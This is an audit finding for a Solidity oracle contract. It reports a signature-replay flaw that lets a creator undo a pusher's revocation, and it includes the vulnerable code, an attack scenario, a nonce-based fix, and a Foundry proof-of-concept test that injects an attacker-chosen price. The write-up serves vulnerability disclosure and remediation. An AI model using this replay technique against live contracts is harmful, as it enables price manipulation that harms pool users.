### Title
Pusher Delegation Signature Replay Allows Creator to Nullify Pusher's Revocation, Enabling Continued Bad-Price Injection — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`allowPushers` in `CompressedOracleV1` verifies a pusher's EIP-191 consent signature but never invalidates it after first use. A creator can replay the identical signature to re-establish a pusher's delegation immediately after the pusher calls `revokePusher()`, as long as the deadline has not expired. This breaks the invariant that a pusher can always self-revoke, and creates a window where a compromised pusher key can continue writing bad prices into the creator's namespace — and from there into any pool that consumes that feed.

---

### Finding Description

`allowPushers` signs over `(chainid, address(this), deadline, pusher, msg.sender)` with no nonce:

```solidity
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
);
require(pusher == ECDSA.recover(hash, signatures[i]));

namespaceRemapping[pusher] = msg.sender;
``` [1](#0-0) 

The signature is not consumed or invalidated after use. `revokePusher` clears the mapping:

```solidity
namespaceRemapping[msg.sender] = address(0);
``` [2](#0-1) 

Because the same `(chainid, oracle, deadline, pusher, creator)` tuple is still valid, the creator can immediately call `allowPushers` again with the original signature to write `namespaceRemapping[pusher] = creator` back. This cycle can repeat indefinitely until the deadline expires.

The code comment itself acknowledges the risk but treats the deadline as the complete fix:

> "The deadline is likewise required: the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it." [3](#0-2) 

The deadline limits the *outer* window but does nothing to prevent replay *within* that window. A pusher who signed a 30-day consent cannot revoke for 30 days if the creator keeps replaying the signature.

The downstream write path is the `fallback()` function, which resolves the namespace at call time:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [4](#0-3) 

Every push from the pusher's address lands in the creator's namespace as long as the remapping is active. The `price()` function is permissionless and returns whatever is stored:

```solidity
function price(bytes32 feedId, address /* pool */) external view
    returns (uint256 mid, uint256 spread, uint16 spread1, uint256 refTime)
{
    return _price(feedId);
}
``` [5](#0-4) 

---

### Impact Explanation

**Scenario — compromised pusher key:**

1. Pusher signs consent with `deadline = now + 30 days`.
2. Creator calls `allowPushers` — delegation established.
3. Pusher's private key is compromised.
4. Pusher calls `revokePusher()` — `namespaceRemapping[pusher] = 0`.
5. Creator (unaware of the compromise, or maliciously) calls `allowPushers` again with the same signature — delegation re-established.
6. Attacker (holding the pusher's key) pushes arbitrary slot words through `fallback()` into the creator's namespace.
7. Any pool or `PriceProvider` consuming that feed reads the attacker-controlled price.

The `fallback` timestamp monotonicity check only prevents *older* values from overwriting *newer* ones; it does not prevent an attacker from pushing a fresh, higher timestamp with a fabricated price. The attacker can push any price that passes the `MAX_TIME_DRIFT` future-timestamp guard.

This satisfies the **bad-price execution** impact gate: an attacker-controlled bid/ask quote reaches a live pool swap.

---

### Likelihood Explanation

- The creator must replay the signature (either in good faith, not knowing the key is compromised, or deliberately).
- The pusher's consent signature is broadcast on-chain in the original `allowPushers` call, so it is publicly observable.
- Deadlines are typically set days to weeks in the future to avoid operational friction, giving a large replay window.
- No on-chain mechanism prevents the creator from calling `allowPushers` again; `_ensureDeadline` only checks `block.timestamp <= deadline`. [6](#0-5) 

Likelihood: **Medium** — requires creator cooperation (deliberate or inadvertent), but the signature is public and the creator has a strong operational incentive to keep the pusher active.

---

### Recommendation

Add a per-pusher nonce to the signed message and increment it on every successful `allowPushers` call:

```solidity
mapping(address => uint256) public pusherNonce;

// In allowPushers:
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(
        block.chainid, address(this), deadline,
        pusher, msg.sender, pusherNonce[pusher]++
    ))
);
```

This ensures each consent signature is single-use. After `revokePusher()` increments (or the creator increments) the nonce, the old signature is permanently invalid.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

// Foundry test demonstrating replay of allowPushers after revokePusher

function testSignatureReplayAfterRevoke() public {
    uint256 deadline = block.timestamp + 30 days;

    // 1. Pusher signs consent
    bytes memory sig = _signConsent(PUSHER_KEY, deadline, pusher, creator);

    address[] memory pushers = new address[](1);
    pushers[0] = pusher;
    bytes[] memory sigs = new bytes[](1);
    sigs[0] = sig;

    // 2. Creator establishes delegation
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs);
    assertEq(oracle.namespaceRemapping(pusher), creator);

    // 3. Pusher revokes (e.g., key compromised)
    vm.prank(pusher);
    oracle.revokePusher();
    assertEq(oracle.namespaceRemapping(pusher), address(0));

    // 4. Creator replays the SAME signature — succeeds, no revert
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs); // <-- replay
    assertEq(oracle.namespaceRemapping(pusher), creator); // delegation re-established

    // 5. Attacker (with pusher key) pushes bad price into creator namespace
    uint56 tsMs = uint56(block.timestamp * 1000);
    uint48 badPrice = _packRaw(9_999_999, 1, 1); // attacker-chosen price
    vm.prank(pusher); // attacker controls pusher key
    (bool ok,) = address(oracle).call(_wordAt(0, 0, badPrice, tsMs));
    assertTrue(ok);

    // 6. Bad price is now live in creator's namespace
    IOffchainOracle.OracleData memory data =
        oracle.getOracleData(oracle.feedIdOf(creator, 0, 0));
    assertEq(data.price, U64x32.decode(uint32(badPrice >> 16)));
    // Any pool reading feedIdOf(creator, 0, 0) now receives the attacker's price
}
``` [7](#0-6) [2](#0-1) [8](#0-7)

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L163-169)
```text
    function price(bytes32 feedId, address /* pool */)
        external
        view
        returns (uint256 mid, uint256 spread, uint16 spread1, uint256 refTime)
    {
        return _price(feedId);
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L186-191)
```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L192-212)
```text
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L238-243)
```text
    function revokePusher() external {
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L311-344)
```text
    fallback() override external {
        uint256 end;
        uint256 namespace;

        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;

        assembly ("memory-safe") {
            end := calldatasize()
            namespace := shl(96, creator) // [creator:20][zeros:12]
        }

        // 4 * 6 + 7 + 1 = 32 bytes per slot
        if (end == 0 || end % 32 != 0) revert BadCalldataLength();

        for (uint256 ptr = 0; ptr < end; ptr += 32) {
            uint256 word;
            assembly ("memory-safe") {
                word := calldataload(ptr)
            }
            // casting to 'uint8' is safe we want LSB
            // forge-lint: disable-next-line(unsafe-typecast)
            uint8 slotId = uint8(word);
            TimeMs timestampMs = toTimeMs(word >> 8 & X56);
            timestampMs.revertIfAfterBlockTimeWithDrift(MAX_TIME_DRIFT);
            bytes32 key = bytes32(namespace | uint256(slotId));
            uint256 old = uint256(_loadStorage(key));
            TimeMs oldTimestampMs = toTimeMs(old >> 8 & X56);

            bool newer = timestampMs.isAfter(oldTimestampMs);
            if (!newer) continue;

            _writeStorage(key, bytes32(bytes32(word & ~uint256(0xff))));
        }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/OracleBase.sol (L124-126)
```text
    function _ensureDeadline(uint256 deadline) internal view virtual {
        require(block.timestamp <= deadline, DeadlineExceeded());
    }
```
